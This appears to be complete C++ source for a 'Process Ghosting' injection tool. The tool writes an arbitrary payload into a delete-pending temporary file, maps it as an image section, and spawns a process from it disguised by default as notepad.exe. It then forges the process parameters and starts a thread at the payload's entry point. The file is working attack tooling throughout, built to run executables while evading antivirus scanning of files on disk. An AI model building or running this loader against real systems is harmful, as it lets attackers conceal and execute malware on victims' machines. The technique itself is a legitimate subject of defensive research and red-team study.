/**
* Process Ghosting - Inject code into a process by creating a malicious section using a delete pending file.
* Supports 32- and 64 Bit applications. The 64 bit implementation currently does not support copying the environment in the remote process.
* No support for WoW64
* Based on: https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf
*/

#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <userenv.h>

#include "ntddk.h"

#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#define PS_INHERIT_HANDLES 4

using fnNtCreateProcessEx = NTSTATUS(NTAPI*)(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ParentProcess,
	_In_ ULONG Flags,
	_In_opt_ HANDLE SectionHandle,
	_In_opt_ HANDLE DebugPort,
	_In_opt_ HANDLE ExceptionPort,
	_In_ ULONG JobMemberLevel
	);

using fnNtCreateThreadEx = NTSTATUS(NTAPI*) (
	OUT  PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	IN  PVOID StartRoutine,
	IN  PVOID Argument OPTIONAL,
	IN  ULONG CreateFlags,
	IN  ULONG_PTR ZeroBits,
	IN  SIZE_T StackSize OPTIONAL,
	IN  SIZE_T MaximumStackSize OPTIONAL,
	IN  PVOID AttributeList OPTIONAL
	);

using fnRtlCreateProcessParametersEx = NTSTATUS(NTAPI*)(
	_Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags
	);

fnNtCreateProcessEx NtCreateProcessEx;
fnNtCreateThreadEx NtCreateThreadEx;
fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx;

int8_t* CreatePayloadBuffer(char* filename, DWORD* filesize)
{
	// open payload file
	HANDLE payloadFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (payloadFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to open payload %s\n", GetLastError(), filename);
		return nullptr;
	}

	// create a mapping of the payload
	HANDLE payloadMapping = CreateFileMapping(payloadFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!payloadMapping)
	{
		printf("[Error] %d - Failed to CreateFileMapping\n", GetLastError());
		CloseHandle(payloadFile);
		return nullptr;
	}

	// map a view of the payload file into the process
	int8_t* payloadDataView = (int8_t*)MapViewOfFile(payloadMapping, FILE_MAP_READ, 0, 0, 0);
	if (!payloadDataView)
	{
		printf("[Error] %d - Failed to MapViewOfFile\n", GetLastError());
		CloseHandle(payloadMapping);
		CloseHandle(payloadFile);
		return nullptr;
	}

	// allocate space for a copy of the payload
	*filesize = GetFileSize(payloadFile, 0);
	int8_t* payloadFileCopy = (int8_t*)VirtualAlloc(NULL, *filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!payloadFileCopy)
	{
		printf("[Error] %d - Failed to VirtualAlloc\n", GetLastError());
		return nullptr;
	}

	// copy payload into allocated memory
	memcpy(payloadFileCopy, payloadDataView, *filesize);

	// cleanup
	UnmapViewOfFile(payloadDataView);
	CloseHandle(payloadMapping);
	CloseHandle(payloadFile);
	return payloadFileCopy;
}

HANDLE CreateDirtySectionOfDeletePendingFile(int8_t* payloadBuffer, DWORD payloadSize)
{
	// get a temporary file. It only matters that it exists and we can open it (no shared conflict etc.)
	wchar_t tempFileName[MAX_PATH];
	wchar_t tempFilePath[MAX_PATH];
	GetTempPathW(MAX_PATH, tempFilePath);
	GetTempFileNameW(tempFilePath, L"fhs", 0, tempFileName);

	std::wstring ntTempFileName = L"\\??\\" + std::wstring(tempFileName);
	UNICODE_STRING tempFileNameUni;
	RtlInitUnicodeString(&tempFileNameUni, ntTempFileName.c_str());

	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, &tempFileNameUni, NULL, NULL, NULL);

	IO_STATUS_BLOCK ioStatusBlock;
	HANDLE deletePendingFileHandle = INVALID_HANDLE_VALUE;
	if (!NT_SUCCESS(NtOpenFile(&deletePendingFileHandle,
		DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
		&objectAttributes,
		&ioStatusBlock,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
	)))
	{
		printf("[Error] - Failed to open temporary file\n");
		return nullptr;
	}

	// set delete flag whch will delete the file as soon as its closed
	FILE_DISPOSITION_INFORMATION fileDispositionInformation = {};
	fileDispositionInformation.DeleteFile = true;
	if (!NT_SUCCESS(NtSetInformationFile(deletePendingFileHandle, &ioStatusBlock, &fileDispositionInformation, sizeof(fileDispositionInformation), FileDispositionInformation)))
	{
		printf("[Error] - Failed to set delete flag on file using NtSetInformationFile\n");
		return nullptr;
	}

	printf("[Info] - Set delete flag on temporary file\n");

	// overwrite content of delete pending file with payload
	LARGE_INTEGER byteOffset = {};
	if (!NT_SUCCESS(NtWriteFile(deletePendingFileHandle, NULL, NULL, NULL, &ioStatusBlock, payloadBuffer, payloadSize, &byteOffset, NULL)))
	{
		printf("[Error] - Failed to write payload into delete pending file\n");
		return nullptr;
	}

	printf("[Info] - Wrote payload to delete pending file\n");
	
	HANDLE dirtySection = nullptr;
	if (!NT_SUCCESS(NtCreateSection(&dirtySection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, deletePendingFileHandle)))
	{
		printf("[Error] - Failed to create dirty section of delete pending file\n");
		return nullptr;
	}
	
	printf("[Info] - Created dirty section of delete pending file\n");

	// this indirectly deletes the file due to the delete flag
	NtClose(deletePendingFileHandle);

	return dirtySection;
}

LPVOID WriteParametersIntoRemoteProcess(HANDLE processHandle, PRTL_USER_PROCESS_PARAMETERS processParameters)
{
	// determine which local address is lower so we can copy the parameters to a single page
	PVOID bufferStart = processParameters < processParameters->Environment ? processParameters : processParameters->Environment;
	PVOID bufferEnd = processParameters < processParameters->Environment ? (int8_t*)processParameters + processParameters->Length : (int8_t*)processParameters->Environment + processParameters->EnvironmentSize;
	DWORD_PTR bufferSize = (DWORD_PTR)bufferEnd - (DWORD_PTR)bufferStart;

	PVOID remoteMemory = VirtualAllocEx(processHandle, bufferStart, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to VirtualAllocEx at address %p\n", GetLastError(), bufferStart);
		return nullptr;
	}

	if (!WriteProcessMemory(processHandle, processParameters, processParameters, processParameters->Length, nullptr))
	{
		printf("[Error] %d - Failed to write PRTL_USER_PROCESS_PARAMETERS to remote process\n", GetLastError());
		return nullptr;
	}

#ifdef _WIN64
	printf("[Warning] - The current x64 implemenation does not support copying the environment since writing the environment to the remote process fails\n");
#else
	if (processParameters->Environment)
	{
		if (!WriteProcessMemory(processHandle, processParameters->Environment, processParameters->Environment, processParameters->EnvironmentSize, nullptr))
		{
			printf("[Error] %d - Failed to write environment to remote process\n", GetLastError());
			return nullptr;
		}
	}
#endif
	return processParameters;
}

bool SetupProcessParameters(HANDLE processHandle, PROCESS_BASIC_INFORMATION& processBasicInformation, char* targetPath)
{
	// initialise process parameters
	ANSI_STRING targetPathAnsi;
	UNICODE_STRING targetPathUni;
	UNICODE_STRING uWindowName;
	UNICODE_STRING dllPathUni;
	UNICODE_STRING currentDirectoryPathUni;

	wchar_t dllPath[] = L"C:\\Windows\\System32";
	wchar_t windowName[] = L"Process Ghosting";
	wchar_t currentDirectoryPath[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, currentDirectoryPath);

	RtlInitUnicodeString(&uWindowName, windowName);
	RtlInitUnicodeString(&currentDirectoryPathUni, currentDirectoryPath);
	RtlInitUnicodeString(&dllPathUni, dllPath);
	RtlInitAnsiString(&targetPathAnsi, targetPath);
	RtlAnsiStringToUnicodeString(&targetPathUni, &targetPathAnsi, TRUE);

	LPVOID environment;
	CreateEnvironmentBlock(&environment, NULL, TRUE);

	PRTL_USER_PROCESS_PARAMETERS processParameters = nullptr;
	if (!NT_SUCCESS(RtlCreateProcessParametersEx(&processParameters, &targetPathUni, &dllPathUni, &currentDirectoryPathUni, &targetPathUni, environment, &uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED)))
	{
		printf("[Error] - Failed to RtlCreateProcessParametersEx\n");
		return false;
	}

	// write process parameters into the remote process
	LPVOID remoteProcessParameters = WriteParametersIntoRemoteProcess(processHandle, processParameters);
	if (!remoteProcessParameters)
	{
		printf("[Error] - Failed to write process parameters into remote process\n");
		return false;
	}

	int8_t* remoteProcessParameterAddress = (int8_t*)processBasicInformation.PebBaseAddress + offsetof(PEB, ProcessParameters);

	// update pointer to process parameters in remote PEB
	if (!WriteProcessMemory(processHandle, remoteProcessParameterAddress, &remoteProcessParameters, sizeof(PVOID), nullptr))
	{
		printf("[Error] %d - Failed to write process parameters into remote PEB\n", GetLastError());
		return false;
	}

	return true;
}

bool Ghost(char* targetPath, int8_t* payloadBuffer, DWORD payloadSize)
{
	HANDLE dirtySectionHandle = CreateDirtySectionOfDeletePendingFile(payloadBuffer, payloadSize);
	if (!dirtySectionHandle) 
	{
		printf("[Error] - Failed to create dirty section from delete pending file\n");
		return false;
	}

	printf("[Info] - Created dirty section with handle %p\n", dirtySectionHandle);

	HANDLE processHandle = nullptr;
	if (!NT_SUCCESS(NtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, dirtySectionHandle, NULL, NULL, FALSE)))
	{
		printf("[Error] - Failed to NtCreateProcessEx using dirty section");
		return false;
	}

	DWORD returnLength = 0;

	// get entry point offset of payload
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
	DWORD entryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;

	// get address of remote image base
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	NTSTATUS error = NtQueryInformationProcess(processHandle, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}
	int8_t* imageBaseAddress = (int8_t*)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);

	// read remote image base
	DWORD_PTR imageBase;
	if (!ReadProcessMemory(processHandle, imageBaseAddress, &imageBase, sizeof(void*), nullptr))
	{
		printf("[Error] %d - Failed to read remote image base address\n", GetLastError());
	}

	DWORD_PTR payloadEntryPoint = imageBase + entryPoint;

	printf("[Info] - Payload entry point %p\n", payloadEntryPoint);

	if (!SetupProcessParameters(processHandle, processBasicInformation, targetPath))
	{
		printf("[Error] - Failed to SetupProcessParameters\n");
		return false;
	}

	HANDLE threadHandle = NULL;
	if (!NT_SUCCESS(NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, (LPTHREAD_START_ROUTINE)payloadEntryPoint, NULL, FALSE, 0, 0, 0, NULL)))
	{
		printf("[Error] - Failed to NtCreateThreadEx\n");
		return false;
	}

	printf("[Info] - Created thread executing %p\n", payloadEntryPoint);

	return true;
}

int main(int argc, char* argv[])
{
	char* applicationPath = "C:\\Windows\\System32\\notepad.exe";
	char* payloadPath = "";

	if (argc == 2)
	{
		printf("[Info] - Using default target: %s\n", applicationPath);
		payloadPath = argv[1];
	}
	if (argc == 3)
	{
		applicationPath = argv[1];
		payloadPath = argv[2];
	}

	if (argc != 2 && argc != 3)
	{
		printf("Usage: *.exe [applicationPath] payloadPath\n");
		return 1;
	}

	HMODULE ntdllHandle = LoadLibraryA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Error] %d - Failed to LoadLibraryA ntdll\n", GetLastError());
		return 1;
	}
	NtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(ntdllHandle, "NtCreateProcessEx");
	NtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(ntdllHandle, "NtCreateThreadEx");
	RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(ntdllHandle, "RtlCreateProcessParametersEx");

	if (!RtlCreateProcessParametersEx || !NtCreateProcessEx || !NtCreateThreadEx)
	{
		printf("[Error] - Failed to resolve NtCreateProcessEx, NtCreateThreadEx or RtlCreateProcessParametersEx\n");
		return 1;
	}

	DWORD payloadSize;
	int8_t* payloadBuffer = CreatePayloadBuffer(payloadPath, &payloadSize);
	if (!payloadBuffer)
	{
		printf("[Error] - Failed to read payload\n");
		return 1;
	}

	printf("[Info] - Created payload buffer at %p\n", payloadBuffer);

	if (!Ghost(applicationPath, payloadBuffer, payloadSize))
	{
		printf("[Error] - Failed process ghosting\n");
		return 1;
	}

	return 0;
}